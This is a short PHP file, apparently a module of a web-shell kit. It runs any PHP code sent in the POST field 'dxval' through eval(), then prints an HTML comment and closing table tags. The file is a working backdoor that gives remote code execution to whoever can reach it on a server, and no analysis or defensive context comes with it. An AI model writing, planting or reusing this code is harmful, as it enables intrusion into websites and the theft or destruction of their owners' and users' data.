<?php
if (isset($_POST['dxval']))
{	
	eval($_POST['dxval']);
	print str_repeat("\n", 10).'<!--/php_eval-->'.'</td></tr></table>';
}
?>